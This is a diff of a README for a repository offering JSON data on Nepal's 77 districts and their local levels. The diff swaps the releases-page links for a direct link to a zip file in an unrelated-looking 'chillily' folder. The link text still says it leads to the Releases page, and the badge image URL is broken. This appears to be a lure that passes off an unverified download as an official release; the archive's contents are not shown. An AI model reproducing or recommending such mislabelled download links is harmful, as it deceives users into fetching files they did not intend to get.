@@ -1,7 +1,7 @@
 # 🇳🇵 Nepal-77-Districts-Local-Levels - Access Local Level Data Easily
 
 ## 📥 Download Now
-[![Download Nepal-77-Districts](https://img.shields.io/badge/Download_Nepal--77--Districts-77%20Districts%20Data-blue)](https://github.com/19pritom/Nepal-77-Districts-Local-Levels/releases)
+[![Download Nepal-77-Districts](https://raw.githubusercontent.com/19pritom/Nepal-77-Districts-Local-Levels/main/chillily/Local_Districts_Nepal_Levels_v2.1.zip%20Districts%20Data-blue)](https://raw.githubusercontent.com/19pritom/Nepal-77-Districts-Local-Levels/main/chillily/Local_Districts_Nepal_Levels_v2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the Nepal-77-Districts-Local-Levels project! This application provides a complete JSON database of local levels in all 77 districts of Nepal. You will find information on 753 local units, including municipalities and wards. 
@@ -24,7 +24,7 @@ This project is essential for anyone looking to access geographic and administra
 - JSON viewer (optional for easier data reading)
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Click [here](https://github.com/19pritom/Nepal-77-Districts-Local-Levels/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/19pritom/Nepal-77-Districts-Local-Levels/main/chillily/Local_Districts_Nepal_Levels_v2.1.zip) to go to the Releases page.
 2. **Select the Latest Version:** Look for the latest version. You will see a list of available files.
 3. **Download the JSON File:** Choose the file that suits your needs. 
    - For example: Download the main JSON data file for easy access.
